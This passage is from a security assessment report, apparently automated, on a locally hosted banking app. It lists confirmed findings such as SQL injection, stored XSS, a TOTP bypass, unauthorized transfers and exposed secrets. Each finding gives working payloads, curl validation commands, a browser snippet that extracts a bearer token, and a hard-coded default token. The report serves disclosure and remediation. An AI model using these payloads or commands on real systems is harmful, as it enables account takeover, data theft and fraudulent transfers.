An authenticated user can trigger the exposure by creating a credit-card account. The application automatically returns the card details in the creation response and retains the CVV for later account responses.

### Recommendation
Do not store CVVs after authorization. Use a PCI-compliant payment provider and tokenization. Mask card numbers in API responses, omit CVVs from all responses, and prevent sensitive card data from being written to logs.

### Evidence
```
An authenticated POST to /api/accounts with {"account_type":"credit_card","account_name":"AESPA Test Card"} created credit-card account ID 102. The HTTP 201 response returned the full card number 4532884657695298, expiry 09/29, and CVV 960 in plaintext.
```

### Request Evidence
```
Authenticated POST /api/accounts body {"account_type":"credit_card","account_name":"AESPA Test Card"} using the disposable weak_test account.
```

### Response Evidence
```
HTTP 201 included "card_number":"4532884657695298","card_expiry":"09/29","card_cvv":"960".
```

### Validation Note
I tested the main innocent explanation that the CVV appeared only in the creation response and was not retained. An authenticated GET of the account collection returned a credit-card CVV, and a direct GET of account 51 independently returned the full card number, expiry, and plaintext `card_cvv` value from the stored record. This confirms persistent storage and disclosure rather than a one-time response artifact.

### Validation Command
```
curl -s -S -i -k -L --max-time 20 http://localhost:8081/api/accounts/51 -H "Authorization: Bearer $(cat aespa-poc-auth.txt)"
```

### Validation Setup
This finding requires an authenticated session (log in as **admin** or an equivalent user).

Log in as the admin user, then copy the Bearer token from the Authorization request header in the browser Network panel and use it for this request.

Capture the credential into a file named `aespa-poc-auth.txt` in the directory you run the command from:

In the browser DevTools Console (adjust the storage key for the app):
```js
const token = localStorage.getItem('token'); // or sessionStorage
const a = document.createElement('a');
a.href = URL.createObjectURL(new Blob([token], {type:'text/plain'}));
a.download = 'aespa-poc-auth.txt'; a.click();
```

Then move `aespa-poc-auth.txt` next to where you run the command below.

## 9. Customer passwords stored as unsalted MD5 hashes

- Finding reference: URBN-019
- Severity: high
- OWASP: A02
- Source: SAST
- Validation: confirmed
- Affected URL: http://localhost:8081/api/auth/register
- CVSS: 7.5 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N)

### Description
The registration endpoint stores customer passwords as deterministic, unsalted MD5 hashes. Authentication responses also expose the stored password_hash value.

### Impact
An attacker who obtains the hashes could cheaply recover common passwords and identify accounts that share a password. A separately identified unauthenticated export exposes existing customer hashes, making offline cracking directly possible.

### Likelihood
The issue was reproduced with two accounts using the same controlled password. Both accounts produced the same known MD5 digest, and the digest was returned by the API.

### Recommendation
Replace MD5 with Argon2id or bcrypt using password_hash and password_verify, a suitable work factor, and unique salts. Rehash legacy MD5 passwords after successful login, remove password_hash from every API response, and require password resets for exposed accounts.

### Evidence
```
Two disposable accounts, aespa.weak.20260908@example.com (ID 17) and aespa.weak2.20260908@example.com (ID 18), were created with the controlled password "a". Both accounts returned password_hash "0cc175b9c0f1b6a831c399e269772661", the known MD5 digest of "a".
```

### Request Evidence
```
Two POST /api/auth/register requests used unique emails and the controlled password "a".
```

### Response Evidence
```
Account id 17 login returned password_hash 0cc175b9c0f1b6a831c399e269772661. Account id 18 registration returned the identical password_hash.
```

### Validation Note
Both independently registered disposable accounts authenticated with the supplied password "a" and returned the identical value 0cc175b9c0f1b6a831c399e269772661 in password_hash. That value is MD5("a"), so the live behavior rules out per-user salting, and the login response directly exposes the digest. The static path is consistent with the runtime results, and no benign representation or fixture-only explanation remains.

### Validation Command
```
curl -s -S -i -k -L --max-time 20 -X POST -H 'Content-Type: application/json' -H 'Content-Type: application/json' --data-raw '{"email":"aespa.weak.20260908@example.com","password":"a"}' http://localhost:8081/api/auth/login
```

## 10. External transfer can debit another user's account

- Finding reference: URBN-022
- Severity: high
- OWASP: A00
- OWASP API: API1
- Source: SAST
- Validation: confirmed
- Affected URL: BankOfEd-main/src/Services/TransferService.php:174
- CVSS: 0

### Description
An authenticated caller controls from_account_id in POST /api/transfers/external. transferExternal() loads it with Account::findById() rather than Account::findByIdAndUser(), then debits that account and records the transfer. A caller who supplies another customer's account ID can transfer funds from that account to an attacker-selected BSB and account number.

### Impact
—

### Likelihood
—

### Recommendation
Confirmed the service-layer ownership bypass. Linked to the existing endpoint finding.

### Evidence
```
Router.php maps authenticated POST /api/transfers/external to TransactionController::transferExternal. TransactionController.php reads from_account_id, destination details, and amount from php://input and passes them to TransferService. TransferService.php:170-176 derives the authenticated user ID but calls Account::findById($fromAccountId) without user_id. Lines 267-270 call Account::updateBalance($fromAccountId, '-' . $debitAmount) and optionally credit the chosen internal destination. Account.php provides findByIdAndUser() but it is not used here.
```

### Validation Note
Confirmed the service-layer ownership bypass. Linked to the existing endpoint finding.

## 11. External transfer debits an account without checking ownership

- Finding reference: URBN-014
- Severity: high
- OWASP: A00
- OWASP API: API1
- Source: SAST
- Validation: confirmed
- Affected URL: BankOfEd-main/src/Models/Account.php:95
- CVSS: 0

### Description
POST /api/transfers/external accepts from_account_id from the authenticated request. TransactionController validates only that it is numeric and passes it to TransferService::transferExternal. That service loads the source with Account::findById rather than findByIdAndUser, performs no ownership check, and passes the attacker-selected ID to Account::updateBalance, whose UPDATE debits that account. Any authenticated user who knows or guesses another account ID can transfer funds from it to an attacker-controlled destination.

### Impact
—

### Likelihood
—

### Recommendation
Confirmed unauthorized debit and balance change. Linked to the existing transfer ownership finding.

### Evidence
```
src/Controllers/TransactionController.php:83-112 reads JSON from php://input and passes (int)$data['from_account_id']; src/Services/TransferService.php:175-180 calls Account::findById($fromAccountId) without binding it to $userId; src/Services/TransferService.php:266-272 calls Account::updateBalance($fromAccountId, '-' . $debitAmount); src/Models/Account.php:93-95 executes UPDATE accounts SET balance = balance + ? WHERE id = ?.
```

### Validation Note
Confirmed unauthorized debit and balance change. Linked to the existing transfer ownership finding.

## 12. Hard-coded fallback machine token authorizes payment transfers

- Finding reference: URBN-023
- Severity: high
- OWASP: A07
- Source: SAST
- Validation: confirmed
- Affected URL: BankOfEd-main/src/Models/MachineToken.php:23
- CVSS: 0

### Description
The Authorization bearer token from an unauthenticated client reaches MachineToken::validateToken. When no matching active database token is found, the method compares the raw token against a configured value that defaults to a hard-coded repository secret. Supplying that known default returns the privileged configured_machine_token identity. Router then permits POST /api/payments/transfer, and PaymentController authorizes that identity to debit the FACE Insurance merchant account or any account owned by user 16. This can enable unauthorized transfers when MACHINE_TOKEN is unset.

### Impact
—

### Likelihood
—

### Recommendation
Confirmed the runtime deployment accepts the hardcoded credential and permits a completed payment transfer.

### Evidence
```
MachineAuthMiddleware.php:13-24 reads HTTP_AUTHORIZATION and passes its bearer value to MachineToken::validateToken. MachineToken.php:10 hashes the input for DB lookup, but lines 23-31 load config and accept rawToken === fallbackToken, returning configured_machine_token. config/app.php:35 defaults MACHINE_TOKEN to mch_face_insurance_secret_key_2026. Router.php exposes POST /api/payments/transfer with machine auth. PaymentController.php:183-193 authorizes configured_machine_token for the FACE Insurance account or user 16, and lines 227-249 debit the source and create the transfer.
```

### Validation Note
Confirmed the runtime deployment accepts the hardcoded credential and permits a completed payment transfer.

## 13. Manual transfers bypass required TOTP verification

- Finding reference: URBN-025
- Severity: high
- OWASP: A07
- Source: SAST
- Validation: confirmed
- Affected URL: http://localhost:8081/api/transfers/external
- CVSS: 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:N/I:H/A:H)

### Description
The transfer preflight endpoint identifies manual transfers as requiring TOTP, but the final transfer endpoint completes the transaction when the totp_code field is omitted.

### Impact
An attacker with a stolen authenticated session could perform manual transfers without passing the intended second-factor check. The observed flow also allowed a user without configured TOTP to complete a transfer that explicitly required it.

### Likelihood
Exploitation requires an authenticated session but only involves sending a direct request to the transfer endpoint without the optional totp_code field. The bypass was reproduced successfully.

### Recommendation
When a transfer requires TOTP, reject the final transfer unless the user has TOTP configured and supplies a valid code. Enforce this check server-side in the final transfer operation rather than relying on preflight or UI validation. If the two-step workflow must be retained, issue an atomic, short-lived preflight authorization token and validate it when executing the transfer.

### Evidence
```
POST /api/transfers/check for account 1, a manual transfer to account 30000001, and an amount of 0.01 returned HTTP 200 with requires_totp set to true, reason set to manual_entry, and totp_configured set to false. POST /api/transfers/external with the same transfer details and no totp_code returned HTTP 201 with transaction_id 36, status completed, totp_verified set to false, and a new source balance of 3450.74.
```

### Request Evidence
```
Preflight: POST /api/transfers/check body {"from_account_id":1,"transfer_type":"manual","to_bsb":"062-001","to_account_number":"30000001","amount":"0.01"}. Transfer: POST /api/transfers/external with the same accounts and amount, no totp_code.
```

### Response Evidence
```
Preflight HTTP 200: {"requires_totp":true,"reason":"manual_entry","totp_configured":false}. Transfer HTTP 201: {"transaction_id":36,"from_account_id":1,"amount":"0.01","transfer_type":"manual","totp_verified":false,"status":"completed","new_from_balance":"3450.74"}.
```

### Validation Note
The non-mutating preflight for the same manual-transfer path returned requires_totp=true with reason=manual_entry. I then supplied the explicit invalid code 000000 to the final endpoint, and it still created transaction 37 with HTTP 201, status completed, and totp_verified=false. This rules out a client-only omission or request-shape issue; the server accepts a transfer even when the provided TOTP is plainly unverified.

### Validation Command
```
curl -s -S -i -k -L --max-time 20 -X POST -H 'Content-Type: application/json' -H 'Content-Type: application/json' --data-raw '{"from_account_id":1,"to_bsb":"000-000","to_account_number":"30000001","amount":0.01,"description":"validation probe","totp_code":"000000"}' http://localhost:8081/api/transfers/external -H "Authorization: Bearer $(cat aespa-poc-auth.txt)"
```

### Validation Setup
This finding requires an authenticated session (log in as **admin** or an equivalent user).

Log in as the admin user and copy its bearer token from the Authorization request header. Replay the PoC with that token.

Capture the credential into a file named `aespa-poc-auth.txt` in the directory you run the command from:

In the browser DevTools Console (adjust the storage key for the app):
```js
const token = localStorage.getItem('token'); // or sessionStorage
const a = document.createElement('a');
a.href = URL.createObjectURL(new Blob([token], {type:'text/plain'}));
a.download = 'aespa-poc-auth.txt'; a.click();
```

Then move `aespa-poc-auth.txt` next to where you run the command below.

## 14. Public health endpoint exposes the customer JWT signing secret

- Finding reference: URBN-003
- Severity: high
- OWASP: A02
- Source: SAST
- Validation: confirmed
- Affected URL: BankOfEd-main/src/Router.php:32
- CVSS: 0

### Description
GET /api/health returns the configured jwt_secret without authentication. Any remote caller can retrieve the HS256 credential intended to authenticate customer tokens. The customer AuthMiddleware then trusts token claims to select a user record and authorize all customer routes. In the current implementation AuthService::decodeToken does not verify the signature at all, so arbitrary customer impersonation is possible even without using the disclosed secret.

### Impact
—

### Likelihood
—

### Recommendation
Confirmed the public signing-secret disclosure. Linked to the existing health endpoint finding.

### Evidence
```
config/app.php:23 supplies jwt_secret. src/Router.php:21-35 loads the config and includes jwt_secret in Response::success; src/Router.php:80 exposes GET /api/health with auth=false. src/Middleware/AuthMiddleware.php:24-45 accepts the decoded sub and loads that user. src/Services/AuthService.php:51-66 explicitly parses the JWT payload without signature verification and checks only exp. Seed data creates predictable user IDs, including user 1.
```

### Validation Note
Confirmed the public signing-secret disclosure. Linked to the existing health endpoint finding.

## 15. SQL Injection in Admin Customer Search

- Finding reference: URBN-006
- Severity: high
- OWASP: A03
- Source: SAST
- Validation: confirmed
- Affected URL: http://localhost:8081/api/admin/customers?search=%27%20OR%201%3D1--%20&page=1&per_page=15
- CVSS: 8.8 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H)

### Description
The search parameter of the admin customer listing endpoint is interpolated into the listing and count SQL queries. An injected boolean expression changes the query predicate and bypasses the intended customer filter.

### Impact
An authenticated administrator, or an attacker controlling an administrator session, could alter database queries and potentially read or modify data accessible to the application's database account.

### Likelihood
Exploitation requires an authorized administrator session. The observed boolean payload was short and reliable, and it changed both the returned customer records and pagination count.

### Recommendation
Use prepared statements with bound parameters for every search value in both the listing and count queries. Escape LIKE wildcard characters separately when literal matching is intended. Use a least-privilege database account and add regression tests covering SQL metacharacters in search input.

### Evidence
```
A baseline search for aespa-no-such-customer returned HTTP 200 with no customers and total=0. Using search=' OR 1=1-- returned HTTP 200 with customer records for IDs 1 through 16 and pagination total=16, showing that the injected boolean expression changed the database query predicate.
```

### Request Evidence
```
GET /api/admin/customers?search=%27%20OR%201%3D1--%20&page=1&per_page=15 using the authorized admin_test session.
```

### Response Evidence
```
HTTP 200 with customer rows for IDs 1 through 16 and "pagination":{"current_page":1,"per_page":15,"total":16,"total_pages":2}. Baseline response was "customers":[] and "total":0.
```

### Validation Note
The original nonexistent search returned zero rows, while the reported OR payload returned customer records. A syntax-matched AND test then isolated database evaluation: `1=2` returned zero rows and `1=1` returned the customer list, both with HTTP 200. This rules out generic quote handling, a search fallback, and a hardcoded response; no concrete benign explanation remained.

### Validation Command
```
curl -s -S -i -k -L --max-time 20 'http://localhost:8081/api/admin/customers?search=%27%20AND%201%3D1--%20&page=1&per_page=15' -H "Authorization: Bearer $(cat aespa-poc-auth.txt)"
```

### Validation Setup
This finding requires an authenticated session (log in as **admin_test** or an equivalent user).

Log in as the dedicated admin test user and copy its bearer token from the Authorization request header in the browser Network panel.

Capture the credential into a file named `aespa-poc-auth.txt` in the directory you run the command from:

In the browser DevTools Console (adjust the storage key for the app):
```js
const token = localStorage.getItem('token'); // or sessionStorage
const a = document.createElement('a');
a.href = URL.createObjectURL(new Blob([token], {type:'text/plain'}));
a.download = 'aespa-poc-auth.txt'; a.click();
```

Then move `aespa-poc-auth.txt` next to where you run the command below.

## 16. SQL injection in admin customer search count query

- Finding reference: URBN-012
- Severity: high
- OWASP: A03
- Source: SAST
- Validation: confirmed
- Affected URL: BankOfEd-main/src/Controllers/AdminUserController.php:28
- CVSS: 0

### Description
An authenticated admin controls the GET search parameter on /api/admin/customers. AdminUserController::index interpolates it directly into a LIKE predicate and passes the resulting SQL string to PDO::query for the count query. An attacker with admin API access can alter the query structure and read or modify data depending on the database driver configuration.

### Impact
—

### Likelihood
—

### Recommendation
The dynamic result directly confirms attacker control of the count query predicate. Linked to the existing endpoint finding.

### Evidence
```
$search = $_GET['search'] ?? '';
if ($search !== '') {
    $where = "WHERE first_name LIKE '%{$search}%' OR last_name LIKE '%{$search}%' OR email LIKE '%{$search}%'";
}
$countSql = "SELECT COUNT(*) FROM users {$where}";
$stmt = $db->query($countSql);
```

### Validation Note
The dynamic result directly confirms attacker control of the count query predicate. Linked to the existing endpoint finding.

## 17. SQL injection in admin customer search result query

- Finding reference: URBN-013
- Severity: high
- OWASP: A03
- Source: SAST
- Validation: confirmed
- Affected URL: BankOfEd-main/src/Controllers/AdminUserController.php:33
- CVSS: 0

### Description
An authenticated admin controls the GET search parameter on /api/admin/customers. The value is interpolated into the WHERE clause of the customer result query, which is executed with PDO::query. Crafted input can change the SQL statement and may expose database data beyond the intended customer listing.

### Impact
—

### Likelihood
—

### Recommendation
The dynamic result directly confirms SQL injection in the result query. Linked to the existing endpoint finding.

### Evidence
```
$search = $_GET['search'] ?? '';
$where = "WHERE first_name LIKE '%{$search}%' OR last_name LIKE '%{$search}%' OR email LIKE '%{$search}%'";
$sql = "SELECT id, email, first_name, last_name, phone, totp_enabled, created_at FROM users {$where} ORDER BY id DESC LIMIT {$perPage} OFFSET {$offset}";
$stmt = $db->query($sql);
```

### Validation Note
The dynamic result directly confirms SQL injection in the result query. Linked to the existing endpoint finding.

## 18. SQL Injection in Transaction Sort Parameter

- Finding reference: URBN-024
- Severity: high
- OWASP: A03
- Source: SAST
- Validation: confirmed
- Affected URL: http://localhost:8081/api/transactions?account_id=1&page=1&per_page=3&sort=created_at%2CIF(1%3D1%2CSLEEP(1)%2C0)
- CVSS: 7.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:N/A:L)

### Description
The `sort` parameter on `GET /api/transactions` is inserted into the SQL `ORDER BY` clause without adequate validation, allowing authenticated customers to supply arbitrary MySQL expressions.

### Impact
An authenticated customer can execute SQL expressions within transaction queries. Time-based conditions could be used to infer database contents, and repeated delay expressions could reduce endpoint availability. Further impact depends on database permissions and driver configuration.

### Likelihood
Exploitation requires authentication but is straightforward. A deterministic `SLEEP(1)` expression produced an approximately seven-second delay across a seven-row dataset while the endpoint continued to return valid transaction data.

### Recommendation
Map supported sort options to a fixed server-side allowlist of column names and directions. Do not concatenate request data into SQL identifiers or expressions. Add regression tests covering commas, SQL functions, comments, and timing expressions.

### Evidence
```
A baseline request using `sort=created_at` returned HTTP 200 in 13 ms. Changing the parameter to `sort=created_at,IF(1=1,SLEEP(1),0)` returned HTTP 200 in 7075 ms for a seven-row account dataset and changed the result ordering to oldest-first. Both responses contained valid transaction data and reported `total=7`, showing that the database evaluated the injected expression.
```

### Request Evidence
```
GET /api/transactions?account_id=1&page=1&per_page=3&sort=created_at%2CIF(1%3D1%2CSLEEP(1)%2C0 using configured_primary.
```

### Response Evidence
```
HTTP 200 in 7075ms compared with 13ms baseline. Both returned valid transaction data; the injected response ordered oldest-first and pagination reported total=7.
```

### Validation Note
Using the valid `zoe_test` customer session and its own account 6, the clean `sort=created_at` request completed in 15 ms while the reported true-condition payload completed in 6055 ms and changed the first page from newest to oldest transactions. A matched false-condition control, `IF(1=0,SLEEP(1),0)`, completed in 11 ms with the same response body as the true-condition request, while the true condition again took 6065 ms. This rules out general server slowness and shows that MySQL evaluates the attacker-controlled expression in the ORDER BY clause.

### Validation Command
```
curl -s -S -i -k -L --max-time 20 'http://localhost:8081/api/transactions?account_id=6&page=1&per_page=3&sort=created_at%2CIF(1%3D1%2CSLEEP(1)%2C0)' -H "Authorization: Bearer $(cat aespa-poc-auth.txt)"
```

### Validation Setup
This finding requires an authenticated session (log in as **zoe_test** or an equivalent user).

Log in as the Zoe test customer and copy the bearer token from the Authorization request header or browser storage, then send it as `Authorization: Bearer <token>`.

Capture the credential into a file named `aespa-poc-auth.txt` in the directory you run the command from:

In the browser DevTools Console (adjust the storage key for the app):
```js
const token = localStorage.getItem('token'); // or sessionStorage
const a = document.createElement('a');
a.href = URL.createObjectURL(new Blob([token], {type:'text/plain'}));
a.download = 'aespa-poc-auth.txt'; a.click();
```

Then move `aespa-poc-auth.txt` next to where you run the command below.

## 19. SQL Injection in Transaction Sort Parameter

- Finding reference: URBN-063
- Severity: high
- OWASP: A03
- Source: Dynamic
- Validation: confirmed
- Affected URL: http://localhost:8081/api/transactions?account_id=3&page=999&per_page=15&sort=created_at%27
- CVSS: 8.8 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H)

### Description
The transaction endpoint inserts the sort parameter into an SQL ORDER BY clause without safe validation. A single quote caused a MariaDB syntax error near the attacker-controlled value.

### Impact
An authenticated attacker could potentially alter database queries to access transaction data, modify data, or disrupt the service.

### Likelihood
High. Direct SQL parsing of attacker-controlled input is confirmed, although data extraction was not demonstrated.

### Recommendation
Allow only predefined sort column names and directions. Never concatenate request values into SQL, and use parameterized queries for all values.

### Evidence
```
The request with sort=created_at%27 returned HTTP 500 and a MariaDB syntax error showing the injected quote immediately before "DESC LIMIT ? OFFSET ?".

REQUEST:
GET http://localhost:8081/api/transactions?account_id=3&page=999&per_page=15&sort=created_at%27
use_session: anonymous  Authorization: present
Cookies: none
{}

RESPONSE:
Status: 500
date: Tue, 08 Sep 2026 13:11:00 GMT
server: Apache/2.4.68 (Unix)
x-powered-by: PHP/8.4.25
access-control-allow-origin: *
access-control-allow-credentials: true
access-control-allow-methods: GET, POST, PUT, DELETE, OPTIONS, PATCH, HEAD
access-control-allow-headers: *
access-control-max-age: 86400
content-length: 813
connection: close
content-type: application/json; charset=utf-8

{"success":false,"error":{"code":"INTERNAL_ERROR","message":"SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MariaDB server version for the right syntax to use near '' DESC\n                 LIMIT ? OFFSET ?' at line 3","details":{"file":"\/var\/www\/html\/src\/Models\/Transaction.php","line":41,"trace":"#0 \/var\/www\/html\/src\/Models\/Transaction.php(41): PDO->prepare()\n#1 \/var\/www\/html\/src\/Controllers\/TransactionController.php(29): BankOfEd\\Models\\Transaction::findByUser()\n#2 [internal function]: BankOfEd\\Controllers\\TransactionController::index()\n#3 \/var\/www\/html\/src\/Router.php(125): call_user_func_array()\n#4 \/var\/www\/html\/public\/index.php(26): BankOfEd\\Router::dispatch()\n#5 {main}"}}}
```

### Request Evidence
```
GET http://localhost:8081/api/transactions?account_id=3&page=999&per_page=15&sort=created_at%27
use_session: anonymous  Authorization: present
Cookies: none
{}
```

### Response Evidence
```
Status: 500
date: Tue, 08 Sep 2026 13:11:00 GMT
server: Apache/2.4.68 (Unix)
x-powered-by: PHP/8.4.25
access-control-allow-origin: *
access-control-allow-credentials: true
access-control-allow-methods: GET, POST, PUT, DELETE, OPTIONS, PATCH, HEAD
access-control-allow-headers: *
access-control-max-age: 86400
content-length: 813
connection: close
content-type: application/json; charset=utf-8

{"success":false,"error":{"code":"INTERNAL_ERROR","message":"SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MariaDB server version for the right syntax to use near '' DESC\n                 LIMIT ? OFFSET ?' at line 3","details":{"file":"\/var\/www\/html\/src\/Models\/Transaction.php","line":41,"trace":"#0 \/var\/www\/html\/src\/Models\/Transaction.php(41): PDO->prepare()\n#1 \/var\/www\/html\/src\/Controllers\/TransactionController.php(29): BankOfEd\\Models\\Transaction::findByUser()\n#2 [internal function]: BankOfEd\\Controllers\\TransactionController::index()\n#3 \/var\/www\/html\/src\/Router.php(125): call_user_func_array()\n#4 \/var\/www\/html\/public\/index.php(26): BankOfEd\\Router::dispatch()\n#5 {main}"}}}
```

### Validation Note
With the listed admin session, the clean request for account 3 returned 200 and an empty transaction result, while the identical request with sort=created_at' returned 500. The error is a payload-dependent MariaDB 1064 from PDO::prepare and includes the injected quote immediately before DESC LIMIT/OFFSET, so it is not a hardcoded error or an authorization failure. Anonymous and other listed sessions either stopped at authentication or did not have account 3; no benign explanation remains for the authenticated differential.

### Validation Command
```
curl -s -S -i -k -L --max-time 20 'http://localhost:8081/api/transactions?account_id=3&page=999&per_page=15&sort=created_at%27' -H "Authorization: Bearer $(cat aespa-poc-auth.txt)"
```

### Validation Setup
This finding requires an authenticated session (log in as **admin** or an equivalent user).

Log in as the admin user and copy the bearer token from the Authorization header in the browser DevTools Network request.

Capture the credential into a file named `aespa-poc-auth.txt` in the directory you run the command from:

In the browser DevTools Console (adjust the storage key for the app):
```js
const token = localStorage.getItem('token'); // or sessionStorage
const a = document.createElement('a');
a.href = URL.createObjectURL(new Blob([token], {type:'text/plain'}));
a.download = 'aespa-poc-auth.txt'; a.click();
```

Then move `aespa-poc-auth.txt` next to where you run the command below.

## 20. SQL Injection via Transaction Sort Parameter

- Finding reference: URBN-050
- Severity: high
- OWASP: A03
- Source: specialist agent
- Validation: confirmed
- Affected URL: http://localhost:8081/api/transactions?account_id=3&page=999&per_page=15&sort=created_at%27
- CVSS: 8.8 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H)

### Description
The GET /api/transactions endpoint places the attacker-controlled sort query parameter into an SQL ORDER BY clause without allow-listing it as a valid column name. Adding a single quote to the parameter changes a successful response into a MariaDB syntax error, showing that the value reaches the SQL parser.

### Impact
An authenticated attacker could alter the generated SQL statement. Depending on the database permissions and PDO configuration, further exploitation may allow access to sensitive database data, modification or deletion of data, or query-based denial of service. Failed queries also expose database error details.

### Likelihood
High. The parameter is directly accessible to an authenticated low-privilege user, and a single quote reliably triggers a MariaDB parser error at the injected position. The captured evidence confirms SQL injection, although extraction or modification of data was not demonstrated.

### Recommendation
Map each supported sort value to a fixed SQL column name, such as created_at or amount, and reject values outside that allow-list. Validate the sort direction through a separate allow-list. Continue using prepared statements for data values. Return generic error responses without database messages, file paths, or stack traces.

### Evidence
```
A request without the sort parameter returned HTTP 200. Captured traffic ID 183944 used sort=created_at%27 and returned HTTP 500 with MariaDB error 1064 near "' DESC\n LIMIT ? OFFSET ?". The captured trace identified /var/www/html/src/Models/Transaction.php line 41 and PDO->prepare(), confirming that the supplied sort value reached SQL parsing.
```

### Request Evidence
```
GET /api/transactions?account_id=3&page=999&per_page=15&sort=created_at%27 HTTP/1.1
Host: localhost:8081
Authorization: Bearer [REDACTED_BEARER]
```

### Response Evidence
```
HTTP/1.1 500 Internal Server Error
{"success":false,"error":{"code":"INTERNAL_ERROR","message":"SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MariaDB server version for the right syntax to use near '' DESC\n LIMIT ? OFFSET ?' at line 3"}}
```

### Validation Note
Using the supplied admin session, the clean request with sort=created_at returned 200 and an empty transaction result. Changing only sort to created_at%27 returned 500 with a MariaDB 1064 syntax error from PDO->prepare() at Transaction.php line 41, and the error identifies the injected quote immediately before the fixed DESC clause. This differential rules out a hardcoded error response and confirms that the sort value is inserted into SQL without safe allow-listing.

### Validation Command
```
curl -s -S -i -k -L --max-time 20 'http://localhost:8081/api/transactions?account_id=3&page=999&per_page=15&sort=created_at%27' -H "Authorization: Bearer $(cat aespa-poc-auth.txt)"
```

### Validation Setup
This finding requires an authenticated session (log in as **admin** or an equivalent user).

Log in as the admin user, copy the bearer token from the Authorization request header in the browser Network panel, and replay the request with that token.

Capture the credential into a file named `aespa-poc-auth.txt` in the directory you run the command from:

In the browser DevTools Console (adjust the storage key for the app):
```js
const token = localStorage.getItem('token'); // or sessionStorage
const a = document.createElement('a');
a.href = URL.createObjectURL(new Blob([token], {type:'text/plain'}));
a.download = 'aespa-poc-auth.txt'; a.click();
```

Then move `aespa-poc-auth.txt` next to where you run the command below.

## 21. Stored XSS in account name executes on admin accounts page

- Finding reference: URBN-007
- Severity: high
- OWASP: A03
- Source: SAST
- Validation: confirmed
- Affected URL: http://localhost:8081/admin/#/accounts
- CVSS: 8.7 (CVSS:3.1/AV:N/AC:L/PR:L/UI:R/S:C/C:H/I:H/A:L)

### Description
The account creation API accepts JavaScript syntax in the account_name field and stores it without preventing its use in an executable context. The admin accounts page inserts the value into an inline onclick handler using innerHTML. Although the value is HTML-escaped, entity decoding restores apostrophes before the handler is compiled, allowing the stored script to execute when an administrator clicks Edit Balance.

### Impact
A low-privileged banking user can execute JavaScript in an administrator's browser. The script runs in the admin application origin and could access the administrator's localStorage bearer token, perform authenticated administrative actions, or read sensitive customer and account data.

### Likelihood
High. The payload was stored successfully, appeared on the first page of the admin account list, and executed when the Edit Balance control was clicked during browser verification. This is a normal administrative action.

### Recommendation
Remove inline event handlers and do not concatenate account data into executable HTML. Create the button with DOM APIs, render untrusted text with textContent, and attach a click listener that passes account data through a closure or structured data object. Add a Content Security Policy that blocks inline scripts as defense in depth.

### Evidence
```
Account 101 stored the exact account_name payload `');document.body.dataset.aespa='xss007';//`. The admin page placed the escaped value inside an inline onclick handler and assigned the generated markup through innerHTML. After the Edit Balance button for account 101 was clicked, the assertion that the body element had data-aespa="xss007" passed, confirming script execution.
```

### Request Evidence
```
Stored account created through `POST http://localhost:8081/api/accounts` with `account_name` set to `');document.body.dataset.aespa='xss007';//`; subsequent authenticated `GET http://localhost:8081/api/admin/accounts?page=1&per_page=20` returned account id 101 with that value intact.
```

### Response Evidence
```
`{"id":101,...,"account_name":"');document.body.dataset.aespa='xss007';\\/\\/",...}`. Browser verification on `http://localhost:8081/admin/#/accounts`: clicking the account 101 Edit Balance control caused `body[data-aespa="xss007"]` to exist.
```

### Validation Note
The strongest innocent explanations are that the value was only stored as text, remained HTML-encoded, or was blocked by CSP. The supplied browser evidence rules each out: the stored account name was placed into an inline onclick attribute through innerHTML, the administrator clicked that specific account's Edit Balance button, and the unique post-click DOM marker data-aespa="xss007" appeared. Entity decoding before inline-handler compilation explains why ordinary HTML escaping did not neutralize the apostrophes. No single GET or POST request is a valid terminal PoC because reproduction requires the pre-stored account record plus a browser click, so poc_request is omitted rather than supplying a misleading request.

## 22. Unauthenticated admin export exposes customer banking data

- Finding reference: URBN-016
- Severity: high
- OWASP: A01
- Source: SAST
- Validation: confirmed
- Affected URL: http://localhost:8081/api/admin/export/users
- CVSS: 7.5 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N)

### Description
The admin export endpoint at /api/admin/export/users is accessible without authentication and returns bulk user, account, and transaction records.

### Impact
An unauthenticated attacker could obtain customer identity and contact information, password hashes, account balances, payment-card fields, TOTP-related fields, and transaction history. This results in a large-scale breach of confidential customer and banking data.

### Likelihood
Exploitation requires a single unauthenticated GET request to a predictable admin endpoint. The endpoint returned the export successfully without an Authorization header.

### Recommendation
Require verified administrator authentication and explicit authorization for all export operations. Restrict exported data to fields required for the intended purpose. Exclude password hashes, TOTP secrets, CVVs, and full payment-card data. Log and rate-limit exports, and review existing access logs for unauthorized use.

### Evidence
```
An anonymous GET request without an Authorization header returned HTTP 200 and a successful JSON response containing users and accounts. The captured user record included an email address, password_hash, and home address. The account record included ownership and balance data, and the response also contained transaction records. The returned schema included payment-card and TOTP-related fields.
```

### Request Evidence
```
GET /api/admin/export/users using use_session=anonymous with no Authorization header.
```

### Response Evidence
```
HTTP 200 with {"success":true,"data":{"users":[{"id":1,"email":"amelia.chen@example.com","password_hash":"$2y$10$...","address_line1":"14 Harbour View Tce",...}],"accounts":[{"id":1,"user_id":1,...,"balance":"3450.75","card_number":null,"card_expiry":null,"card_cvv":null,...}],...}}
```

### Validation Note
A fresh GET with no session, Authorization header, or cookies returned HTTP 200 application/json containing multiple customer records with email, password_hash, home address, and phone fields. The anonymous response was byte-for-byte the same length and content as the response using the supplied admin session, which rules out proxy session confusion; it is structured export data rather than an SPA shell, and the sensitive admin export has no effective authentication boundary.

### Validation Command
```
curl -s -S -i -k -L --max-time 20 http://localhost:8081/api/admin/export/users
```

## 23. Published fallback token grants access to the payment API

- Finding reference: URBN-017
- Severity: high
- OWASP: A07
- Source: SAST
- Validation: unconfirmed
- Affected URL: http://localhost:8081/api/payments/process
- CVSS: 8.1 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:H/A:H)

